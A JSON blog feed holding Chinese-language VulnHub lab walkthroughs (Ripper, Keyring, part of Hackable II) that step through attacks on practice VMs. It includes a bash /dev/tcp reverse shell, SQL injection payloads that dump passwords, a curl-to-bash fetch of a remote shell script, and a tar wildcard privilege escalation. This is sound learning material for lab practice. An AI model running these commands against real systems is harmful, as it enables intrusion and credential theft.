{
    "version": "https://jsonfeed.org/version/1",
    "title": "X_T • All posts by \"vulnhub 21-30\" tag",
    "description": "人生如逆旅，我亦是行人",
    "home_page_url": "https://n1h1l157.github.io",
    "items": [
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/121%20RIPPER/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/121%20RIPPER/",
            "title": "VULNHUB 21 RIPPER",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcmlwcGVyLTEsNzA2Lw==\">https://www.vulnhub.com/entry/ripper-1,706/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTQ3ODE2L2FydGljbGUvZGV0YWlscy8xMjMzMzI1ODI=\">https://blog.csdn.net/qq_42947816/article/details/123332582</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 RIPPER：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1）arp 确定靶机地址<br>\n <code>sudo arp-scan -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-480.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.84</p>\n<p>2）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -p- 192.168.31.115</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-481.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 22,80,10000</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuODQ=\">http://192.168.31.84</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-482.png\" width=\"520\" alt=\"Image\">\n<p><code>dirsearch -u http://192.168.31.84</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-483.png\" width=\"340\" alt=\"Image\">\n<p>没有什么新发现，先不管 80 端口的 web<br>\n 查看网站:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuODQ6MTAwMDA=\">http://192.168.31.84:10000</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-484.png\" width=\"520\" alt=\"Image\">\n<p>提示会跳转到 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAw\">https://ripper-min:10000</span><br>\n 修改本地 hosts 文件，将 url 地址改为目标靶机 ip 地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-485.png\" width=\"290\" alt=\"Image\">\n<p>进入到页面 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAw\">https://ripper-min:10000</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-486.png\" width=\"590\" alt=\"Image\">\n<p>一个 webmin 的登陆页面，收集此网站的相关信息</p>\n<h3 id=\"robots-页面查看\"><a class=\"markdownIt-Anchor\" href=\"#robots-页面查看\">#</a> robots 页面查看</h3>\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAwL3JvYm90cy50eHQ=\">https://ripper-min:10000/robots.txt</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-487.png\" width=\"480\" alt=\"Image\">\n<p>找到一个提示，采用的 base64 加密，解密后得到一个关键词 “rips”</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-488.png\" width=\"520\" alt=\"Image\">\n<p>直接将 rips 拿到谷歌上搜索，它是一个做代码分析的工具</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-489.png\" width=\"520\" alt=\"Image\">\n<p>进入到 rips 官网得知，其安装下载之后的目录在 /rips/ 里边</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-490.png\" width=\"520\" alt=\"Image\">\n<p>在原来的 url 地址上拼接上 rips 看是否能有新发现:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAwL3JpcHM=\">https://ripper-min:10000/rips</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-491.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 此页面并没有任何反应，别忘了我们还有一个 80 端口</p>\n<h3 id=\"rip-扫描-web\"><a class=\"markdownIt-Anchor\" href=\"#rip-扫描-web\">#</a> rip 扫描 web</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly8xOTIuMTY4LjMxLjg0L3JpcHMv\">https://192.168.31.84/rips/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-492.png\" width=\"620\" alt=\"Image\">\n<p>进入到了 rips 代码审计的界面，看样子需要填一个 path，根据要求填写为 /var/www 后点击扫描</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-493.png\" width=\"650\" alt=\"Image\">\n<p>扫描到了一些漏洞，并且看到了一个敏感文件 secret.php，点击 secret.php 文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-494.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 得到了泄漏出来的账户和密码 ripper:Gamespeop</p>\n<h3 id=\"可访问文件筛选\"><a class=\"markdownIt-Anchor\" href=\"#可访问文件筛选\">#</a> 可访问文件筛选</h3>\n<p>爆出来的密码可能是 ssh 连接的密码，也可能是网站后台密码，通过 ssh 连接判断是否能登陆到对方的服务器上<br>\n <code>ssh 192.168.31.84 -l ripper</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-495.png\" width=\"460\" alt=\"Image\">\n<p>-&gt; 成功拿到 ripper 的权限，尝试去拿 root 账户的权限</p>\n<p>查询目录结构，看到出了 ripper 之外的另外一个用户 cubes<br>\n 查看出了基础的几个基本目录后，是否有其他文件是这两个用户能操作的<br>\n <code>find / -user ripper 2&gt;/dev/null | grep -v “proc\\|home\\|run\\|sys”</code> <br>\n <code>find / -user cubes 2&gt;/dev/null | grep -v “home”</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-496.png\" width=\"610\" alt=\"Image\">\n<p>发现 cubes 可以操作的文件有一个 secret.file 文件，查看后得到密码<br>\n su cubes 输入密码后成功拿到了 cubes 的权限</p>\n<p>借助 find 来寻找属于用户 cubes 可以操作的文件<br>\n <code>find / -user cubes 2&gt;/dev/null | grep -v “home\\|proc”</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-497.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"备份文件泄露\"><a class=\"markdownIt-Anchor\" href=\"#备份文件泄露\">#</a> 备份文件泄露</h3>\n<p><code>cat /var/webmin/backup/miniser.log</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-498.png\" width=\"650\" alt=\"Image\">\n<p>-&gt; 找到了敏感信息 webmin 的账户和密码：admin:tokiohotel</p>\n<p>进入 webmin 的网站后台登陆地址，输入账户密码进入后台 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAw\">https://ripper-min:10000</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-499.png\" width=\"520\" alt=\"Image\">\n<p>在后台中发现有个 terminal 的标志，直接点击此按钮</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-500.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"后台反弹-shell\"><a class=\"markdownIt-Anchor\" href=\"#后台反弹-shell\">#</a> 后台反弹 shell</h3>\n<p>点击后在 web 页面就会弹出来一个终端窗口，而且是 root 权限的</p>\n<p>但是在 web 界面操作并不是很方遍，接下来把此 shell 进行反弹<br>\n <code>bash - c ‘bash -I &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1’</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-501.png\" width=\"520\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">接受反弹的shell，并且美化终端</span></span><br><span class=\"line\">nc -lvvp 4444</span><br><span class=\"line\">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class=\"line\">stty raw -echo;fg</span><br><span class=\"line\">export TERM=xterm</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-502.png\" width=\"500\" alt=\"Image\">\n<p>-&gt; 最后拿到了一个 root 账户的标准 shell</p>\n",
            "tags": [
                "VULNHUB 21-30"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/123%20KEYRING/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/123%20KEYRING/",
            "title": "VULNHUB 23 KEYRING",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaWEta2V5cmluZy0xMDEsNzE4Lw==\">https://www.vulnhub.com/entry/ia-keyring-101,718/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hsanp6ai9hcnRpY2xlL2RldGFpbHMvMTIyOTUyMzcz\">https://blog.csdn.net/hljzzj/article/details/122952373</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 KEYRING：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1）arp 确定靶机地址<br>\n <code>sudo arp-scan -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-524.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.127</p>\n<p>2）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -p- 192.168.31.208</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-525.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 22,80</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4\">http://192.168.31.208</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-526.png\" width=\"620\" alt=\"Image\">\n<p>是一个注册登陆的界面，直接输入 12345:12345 注册一个账户</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-527.png\" width=\"650\" alt=\"Image\">\n<p>将注册的账户通过 login 界面登陆进去</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-528.png\" width=\"620\" alt=\"Image\">\n<p>登陆后的页面中 Home 是欢迎 12345 用户的信息，下面显示了时间</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-529.png\" width=\"520\" alt=\"Image\">\n<p>在 control 页面，显示的是一个 HPP 参数污染的提示</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-530.png\" width=\"520\" alt=\"Image\">\n<p>目前得到的信息并不能进行攻击，需要寻找更多的信息<br>\n对目标网址进行路径扫描，寻找更多的信息</p>\n<p><code>dirsearch -u http://192.168.31.208</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-531.png\" width=\"410\" alt=\"Image\">\n<p>dirsearch 并没有加载出来有利用价值的信息</p>\n<p><code>gobuster dir -x php,txt,html,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.208</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-532.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; gobuster 扫描出来了一个 history.php 的路径</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhw\">http://192.168.31.208/history.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-533.png\" width=\"460\" alt=\"Image\">\n<h3 id=\"wfuzz-爆破参数\"><a class=\"markdownIt-Anchor\" href=\"#wfuzz-爆破参数\">#</a> wfuzz 爆破参数</h3>\n<p>提示说没有找到活跃的用户，猜测这里是因为没有登陆用户的原因<br>\n找到登陆页面，登陆我们之前注册的用户</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-534.png\" width=\"520\" alt=\"Image\">\n<p>重新打开 history.php 页面，提示信息变成了空白的，说明用户登陆对此页面的回显结果是有影响的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-535.png\" width=\"520\" alt=\"Image\">\n<p>很明显这个 history.php 的文件是存在问题的，怀疑后面是否有参数地址<br>\n可以用 wfuzz 进行爆破参数地址试试</p>\n<p><code>wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.31.208/history.php?FUZZ=xxx</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-536.png\" width=\"700\" alt=\"Image\">\n<p>-&gt; 发现全是 200 ，那就不能用 wfuzz 测试参数了，需要用其他的方式</p>\n<h3 id=\"模糊测试\"><a class=\"markdownIt-Anchor\" href=\"#模糊测试\">#</a> 模糊测试</h3>\n<p>之前收集到的信息中有一句话 “can’t find this user’s activity”，尝试 user 参数<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4=\"> http://192.168.31.208/history.php?user=admin</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-537.png\" width=\"380\" alt=\"Image\">\n<p>爆出来了源码 <span class=\"exturl\" data-url=\"aHR0cDovL2dpdGh1Yi5jb20vY3liZXJib3Q3NS9rZXlyaW5n\">http://github.com/cyberbot75/keyring</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-538.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"手工sql注入\"><a class=\"markdownIt-Anchor\" href=\"#手工sql注入\">#</a> 手工 sql 注入</h3>\n<h4 id=\"判断是否是注入点\"><a class=\"markdownIt-Anchor\" href=\"#判断是否是注入点\">#</a> 判断是否是注入点</h4>\n<p>对 history.php 所在的 url 地址尝试手工判断是否是注入点<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjBhbmQlMjAxPTEtLSs=\"> http://192.168.31.208/history.php?user=admin' and 1=1--+</span></p>\n<p>and 1=1 --+ 被执行，and 1=2 --+ 报错，是注入点</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-539.png\" width=\"520\" alt=\"Image\">\n<h4 id=\"猜字段数\"><a class=\"markdownIt-Anchor\" href=\"#猜字段数\">#</a> 猜字段数</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMDEtLSs=\">http://192.168.31.208/history.php?user=admin' union select 1--+</span></p>\n<p>猜字段有多少个，1 时是正确的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-540.png\" width=\"580\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMDEsMi0tKw==\">http://192.168.31.208/history.php?user=admin' union select 1,2--+</span></p>\n<p>1,2 时报错了，说明只能爆出来一个字段</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-541.png\" width=\"680\" alt=\"Image\">\n<h4 id=\"猜当前数据库\"><a class=\"markdownIt-Anchor\" href=\"#猜当前数据库\">#</a> 猜当前数据库</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4=\">http://192.168.31.208/history.php?user=admin</span>’ union select database()–+</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-542.png\" width=\"570\" alt=\"Image\">\n<p>数据库名是 users</p>\n<h4 id=\"猜数据库\"><a class=\"markdownIt-Anchor\" href=\"#猜数据库\">#</a> 猜数据库</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMGdyb3VwX2NvbmNhdChzY2hlbWFfbmFtZSklMjBmcm9tJTIwaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhLS0r\">http://192.168.31.208/history.php?user=admin' union select group_concat(schema_name) from information_schema.schemata--+</span></p>\n<p>group_concat(schema_name) from information_schema.schemata–+</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-543.png\" width=\"620\" alt=\"Image\">\n<p>一共有四个数据库 information_schema,mysql,performance_schema,sys,users</p>\n<h4 id=\"猜表\"><a class=\"markdownIt-Anchor\" href=\"#猜表\">#</a> 猜表</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSUyMGZyb20lMjBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzJTIwd2hlcmUlMjB0YWJsZV9zY2hlbQ==\">http://192.168.31.208/history.php?user=admin' union select group_concat(table_name) from information_schema.tables where table_schem</span><br>\na=%27users%27–+</p>\n<p>group_concat(table_name) from information_schema.tables where<br>\ntable_schema=‘users’–+</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-544.png\" width=\"520\" alt=\"Image\">\n<p>数据库 user 下有两个表：details,log</p>\n<h4 id=\"猜列\"><a class=\"markdownIt-Anchor\" href=\"#猜列\">#</a> 猜列</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSklMjBmcm9tJTIwaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMlMjB3aGVyZSUyMHRhYmxlX25hbWU9JTI3ZGV0YWlscyUyNy0tKw==\">http://192.168.31.208/history.php?user=admin' union select group_concat(column_name) from information_schema.columns where table_name='details'--+</span></p>\n<p>group_concat(column_name) from information_schema.columns where<br>\ntable_name=‘details’–+</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-545.png\" width=\"620\" alt=\"Image\">\n<p>users.detail 表中有两列：name，password</p>\n<h4 id=\"猜字段\"><a class=\"markdownIt-Anchor\" href=\"#猜字段\">#</a> 猜字段</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMGdyb3VwX2Nv\">http://192.168.31.208/history.php?user=admin' union select group_co</span><br>\nncat(name)%20from%20users.details–+</p>\n<p>group_concat(name) from users.details–+admin,admin123,john,test</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-546.png\" width=\"470\" alt=\"Image\">\n<p>users.detail 中 name 分别是：admin,admin123,john,test</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMGdyb3VwX2NvbmNhdChwYXNzd29yZCklMjBmcm9tJTIwdXNlcnMuZGV0YWlscy0tKw==\">http://192.168.31.208/history.php?user=admin' union select group_concat(password) from users.details--+</span></p>\n<p>group_concat(password) from users.details–+</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-547.png\" width=\"520\" alt=\"Image\">\n<p>users.detail 中 password 分别是：<br>\nmyadmin#p4szw0r4d,admin123,Sup3r<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>S</mi><mn>3</mn><mi>c</mi><mi>r</mi><mn>3</mn><mi>t</mi></mrow><annotation encoding=\"application/x-tex\">S3cr3t</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord\">3</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord\">3</span><span class=\"mord mathnormal\">t</span></span></span></span>PasSW0RD,test</p>\n<p>去除掉自己注册掉的用户之外，发现源网站存在两个用户和密码</p>\n<p>-&gt; Admin: myadmin#p4szw0r4d john: Sup3r<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>S</mi><mn>3</mn><mi>c</mi><mi>r</mi><mn>3</mn><mi>t</mi></mrow><annotation encoding=\"application/x-tex\">S3cr3t</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord\">3</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord\">3</span><span class=\"mord mathnormal\">t</span></span></span></span>PasSW0RD</p>\n<h3 id=\"php-代码审计\"><a class=\"markdownIt-Anchor\" href=\"#php-代码审计\">#</a> php 代码审计</h3>\n<p>由 Admin: myadmin#pszw0r4d 登陆到网站后台</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-548.png\" width=\"520\" alt=\"Image\">\n<p>home.php 页面检测到了 admin 账户已经登陆成功</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-549.png\" width=\"440\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2dpdGh1Yi5jb20vY3liZXJib3Q3NS9rZXlyaW5n\">http://github.com/cyberbot75/keyring</span></p>\n<p>查看源码，审计源码，发现 control.php 存在 RCE 漏洞</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-550.png\" width=\"700\" alt=\"Image\">\n<p>注入参数为 cmdcntr 测试是否回显成功</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2NvbnRyb2wucGhwP2NtZGNudHI9aWQ=\">http://192.168.31.208/control.php?cmdcntr=id</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-551.png\" width=\"620\" alt=\"Image\">\n<p>有回显，RCE 确实存在，测试是否存在相应的可反弹 shell 的命令</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2NvbnRyb2wucGhwP2NtZGNudHI9d2hpY2glMjBjdXJsO3doaWNoJTIwYmFzaDt3aGljaCUyMHB5dGhvbjt3aGljaCUyMHBocDs=\">http://192.168.31.208/control.php?cmdcntr=which curl;which bash;which python;which php;</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-552.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"后台反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#后台反弹shell\">#</a> 后台反弹 shell</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2NvbnRyb2wucGhwP2NtZGNudHI9Y3VybCUyMGh0dHA6Ly93d3cuY2hlbnR1by5hc2lhL3NoZWxsLnNoJTdDYmFzaA==\">http://192.168.31.208/control.php?cmdcntr=curl http://www.chentuo.asia/shell.sh|bash</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-553.png\" width=\"620\" alt=\"Image\">\n<p>接收 shell，并将其转变为一个标准的 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-554.png\" width=\"520\" alt=\"Image\">\n<p>检查各个文件，查看有没有敏感的目录</p>\n<p>发现有一个 john 的用户，之前通过 sql 注入网站爆出的用户名有 john<br>\njohn: Sup3r<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>S</mi><mn>3</mn><mi>c</mi><mi>r</mi><mn>3</mn><mi>t</mi></mrow><annotation encoding=\"application/x-tex\">S3cr3t</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord\">3</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord\">3</span><span class=\"mord mathnormal\">t</span></span></span></span>PasSW0RD 切换到了 john 用户</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-555.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"strings-查看文件\"><a class=\"markdownIt-Anchor\" href=\"#strings-查看文件\">#</a> strings 查看文件</h3>\n<p>翻阅相关的文件，找到了一个敏感的文件 s 权限的 compress<br>\n 但是服务器不存在 strings 不能查看这个命令里封装的是什么</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-556.png\" width=\"520\" alt=\"Image\">\n<p>通过 scp/wget 将文件下载到了 kali 主机上<br>\n strings compress 查看此命令的详细信息，compose 会调用 root 的 s 权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-557.png\" width=\"470\" alt=\"Image\">\n<h3 id=\"tar-通配符提权\"><a class=\"markdownIt-Anchor\" href=\"#tar-通配符提权\">#</a> tar 通配符提权</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">tar通配符提权</span></span><br><span class=\"line\">echo &quot;/bin/bash&quot; &gt; exp.sh</span><br><span class=\"line\">echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh exp.sh&quot;</span><br><span class=\"line\">echo &quot;&quot; &gt; --checkpoint=1</span><br><span class=\"line\">./compress</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-558.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"lxd-提权\"><a class=\"markdownIt-Anchor\" href=\"#lxd-提权\">#</a> lxd 提权</h3>\n<p>在 john 用户下，查看 id 时看到了所有组中有 lxd，并且本地有 lxc 命令</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-559.png\" width=\"420\" alt=\"Image\">\n<p>searchsploit lxd 查找到了本地是存在此 exp 的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-560.png\" width=\"500\" alt=\"Image\">\n<p>阅读利用脚本说明，需要在攻击机上下载并以 root 账户编译该文件，最后将编译成功的文件以及 exp 一块发送到目标机器上</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-561.png\" width=\"520\" alt=\"Image\">\n<p>在攻击机上下载 payload<br>\n <code>wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-562.png\" width=\"550\" alt=\"Image\">\n<p>在攻击机上编译此 payload<br>\n 运行此命令时因为 kali 机器是在 M1 的 mac 电脑上搭建的，属于 aarch，不同于 windows 的 amd64 系统，因此编译失败了</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-563.png\" width=\"470\" alt=\"Image\">\n<p>-&gt; Lxd 提权失败了，需要一台 amd64 的机器进行编译此文件</p>\n",
            "tags": [
                "VULNHUB 21-30"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/124%20HACKABLELL/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/124%20HACKABLELL/",
            "title": "VULNHUB 24 HACKABLELL",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja2FibGUtaWksNzExLw==\">https://www.vulnhub.com/entry/hackable-ii,711/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY4NzYyMS9hcnRpY2xlL2RldGFpbHMvMTE5Mzg2Njgz\">https://blog.csdn.net/weixin_44687621/article/details/119386683</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 HACKABLELL：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址<br>\n <code>sudo arp-scan -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-564.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.6</p>\n<p>2 ）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -p- 192.168.31.6</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-565.png\" 